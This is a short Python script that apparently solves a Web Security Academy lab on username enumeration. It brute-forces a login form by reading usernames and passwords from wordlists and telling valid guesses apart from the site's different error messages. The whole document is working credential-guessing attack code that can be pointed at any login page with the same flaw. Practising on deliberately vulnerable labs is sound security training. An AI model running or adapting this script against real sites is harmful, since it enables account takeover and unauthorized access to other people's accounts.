import requests
import sys


def check_username(url, username):

    password = "password"
    data = f"username={username}&password={password}"

    response = requests.post(url, data=data)
    return not 'Invalid username' in response.content.decode()

def check_password(url, username, password):

    data = f"username={username}&password={password}"

    response = requests.post(url, data=data)
    return not 'Incorrect password' in response.content.decode()


def main():

    login_url = 'https://ac1a1fc21f803ab9c03e0651001900ba.web-security-academy.net/login'
    users_file = 'usernames.txt'
    users = [x.strip() for x in open(users_file).readlines()]
    username = None

    for user in users:

        # print(f"[+] Trying username: {user}")

        if check_username(login_url, user):

            print(f"[+] Found username: {user}")
            username = user
            break

    pass_file = 'passwords.txt'
    passwords = [x.strip() for x in open(pass_file).readlines()]

    for password in passwords:

        # print(f"[+] Trying password: {password}")

        assert username is not None
        if check_password(login_url, username, password):

            print(f"[+] Found password for user '{user}': {password}")
            break

if __name__ == '__main__':
    main()
